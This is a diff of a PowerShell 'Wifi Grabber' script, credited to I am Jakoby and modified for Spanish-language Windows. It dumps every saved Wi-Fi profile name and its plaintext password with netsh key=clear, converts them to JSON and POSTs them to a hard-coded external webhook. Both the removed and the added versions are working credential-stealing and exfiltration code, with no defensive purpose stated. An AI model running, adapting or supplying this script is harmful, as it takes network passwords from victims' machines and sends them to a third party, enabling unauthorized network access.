@@ -1,39 +1,39 @@
 <#
-    Title: Wifi Grabber – Webhook Edition
-    Author: I am Jakoby (modificado)
-    Description: Extrae perfiles de Wi-Fi y envía la tabla resultante a un webhook HTTP.
+    Title: Wifi Grabber – Webhook Español
+    Author: I am Jakoby (modificado para Win-ES)
+    Desc: Extrae perfiles Wi-Fi y envía nombre+clave a un webhook
 #>
 
-# 1) Extraer todos los perfiles y sus contraseñas
-$profiles = netsh wlan show profiles |
-    Select-String ":\s+(.+)$" |
-    ForEach-Object {
-        $name = $_.Matches[0].Groups[1].Value.Trim()
-        # Para cada perfil, obtener su clave en claro
-        $details = netsh wlan show profile name="$name" key=clear
-        $keyLine = $details | Select-String "Key Content\s+:\s+(.+)$"
-        $pass = if ($keyLine) { $keyLine.Matches[0].Groups[1].Value.Trim() } else { "" }
+# URL de tu webhook
+$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'
+
+# 1) Recolectar perfiles
+$perfiles = netsh wlan show profiles `
+    | Select-String 'Perfil de usuario\s*:\s*(.+)$' `
+    | ForEach-Object {
+        $nombre = $_.Matches[0].Groups[1].Value.Trim()
+        # 2) Obtener detalles de cada perfil, incluida la contraseña
+        $detalles = netsh wlan show profile name="$nombre" key=clear
+        $claveLine = $detalles | Select-String 'Contenido de la clave\s*:\s*(.+)$'
+        $clave     = if ($claveLine) { $claveLine.Matches[0].Groups[1].Value.Trim() } else { '' }
         [PSCustomObject]@{
-            Profile  = $name
-            Password = $pass
+            Profile  = $nombre
+            Password = $clave
         }
     }
 
-# Formatear la salida como JSON (más compacto y fácil de procesar)
-$payload = $profiles | ConvertTo-Json
-
-# 2) Enviar al webhook
-$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'
+# 3) Convertir a JSON y POSTear
+$json = $perfiles | ConvertTo-Json
 try {
     Invoke-RestMethod -Uri $webhook `
                       -Method Post `
                       -ContentType 'application/json' `
-                      -Body $payload
-    Write-Host "✅ Datos enviados a webhook."
+                      -Body $json
+    Write-Host "✅ Datos enviados."
 }
 catch {
-    Write-Error "❌ Error al enviar a webhook: $_"
+    Write-Error "❌ Error al enviar: $_"
 }
 
-# 3) (Opcional) Limpieza de artefactos temporales o logs internos si fuese necesario
-# Remove-Variable profiles, payload, webhook
+# 4) Pausa para ver posibles errores si lo ejecutas manualmente
+Read-Host -Prompt 'Presiona Enter para cerrar'
